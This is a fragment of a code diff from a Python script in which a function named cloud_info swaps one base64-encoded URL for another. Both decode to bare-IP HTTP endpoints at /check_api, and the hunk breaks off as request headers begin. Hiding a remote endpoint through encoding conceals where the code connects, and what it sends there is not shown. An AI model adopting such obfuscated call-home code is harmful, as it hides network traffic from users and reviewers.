@@ -397,7 +397,7 @@ def ql_insert(i_ck):
 
 
 def cloud_info():
-    url = str(base64.b64decode('aHR0cDovLzE1MC4xNTguMTUzLjUzOjg0NDMvY2hlY2tfYXBp').decode())
+    url = str(base64.b64decode('aHR0cDovLzQzLjEzNS45MC4yMy9jaGVja19hcGk=').decode())
     for i in range(3):
         try:
             headers = {
